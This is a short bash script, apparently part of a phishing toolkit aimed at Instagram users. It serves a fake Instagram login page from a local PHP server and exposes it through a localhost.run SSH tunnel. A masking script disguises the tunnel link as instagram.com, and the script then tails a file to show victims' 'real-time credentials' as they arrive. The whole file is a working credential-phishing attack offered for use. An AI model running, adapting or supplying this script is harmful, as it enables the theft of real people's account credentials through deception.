#!/bin/bash

# Activate Python virtual environment for masking
source maskenv/bin/activate

# Start PHP server
php -S localhost:8080 -t Instagram-login > /dev/null 2>&1 &
sleep 2
echo "[+] PHP server started on localhost:8080"

# Start localhost.run tunnel
ssh -i ~/.ssh/id_rsa -o StrictHostKeyChecking=no -R 80:localhost:8080 ssh.localhost.run > localhostrun_temp.txt 2>&1 &
localhostrun_pid=$!

echo "[+] Creating localhost.run tunnel..."

while true; do
    if grep -o "https://[0-9a-zA-Z\.]*.lhr.life" localhostrun_temp.txt > /dev/null; then
        break
    fi
    sleep 1
done

localhostrun_link=$(grep -o "https://[0-9a-zA-Z\.]*.lhr.life" localhostrun_temp.txt | head -n 1)
echo "[+] localhost.run link generated: $localhostrun_link"

custom_domain="instagram.com"
fake_message="account"

echo "[+] Using custom domain: $custom_domain"
echo "[+] Using fake message: $fake_message"

cd Masking || exit
echo -e "$localhostrun_link\n$custom_domain\n$fake_message" | python3 masker.py
cd ..

echo "[+] Waiting for victim... Real-time credentials will appear below:"
tail -f Instagram-login/usernames.txt
